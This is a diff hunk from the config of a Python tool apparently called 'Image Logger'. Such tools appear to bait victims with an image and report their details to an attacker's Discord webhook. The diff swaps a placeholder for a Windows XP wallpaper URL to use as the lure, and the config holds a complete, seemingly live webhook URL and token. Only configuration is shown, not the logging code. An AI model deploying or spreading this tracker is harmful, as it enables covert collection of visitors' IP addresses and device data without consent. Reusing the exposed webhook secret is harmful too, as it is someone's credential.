@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG
     "webhook": "https://discord.com/api/webhooks/1439639460382773248/7fVQ1_3b2IEabj9rgMYYFfF0Byqu_su4XhdwLlfjEgxbcoU0Ex8Kv6fAsqStgBAqUYlC",
-    "image": "https://yoursite.com/imagelogger?url=(url-escaped link to an image here)", # You can have a custom image by using a URL argument
+    "image": "https://www.windowslatest.com/wp-content/uploads/2024/10/Windows-XP-Bliss-Wallpaper-4K-scaled.jpg", # You can have a custom image by using a URL argument
     "custom_image": True, # Allows you to use a URL argument to change the image (SEE README)
     "default_image_url": "https://www.windowslatest.com/wp-content/uploads/2024/10/Windows-XP-Bliss-Wallpaper-4K-scaled.jpg", # Your Bliss wallpaper as default!
     "username": "Image Logger", # Set this to the name you want the webhook to have
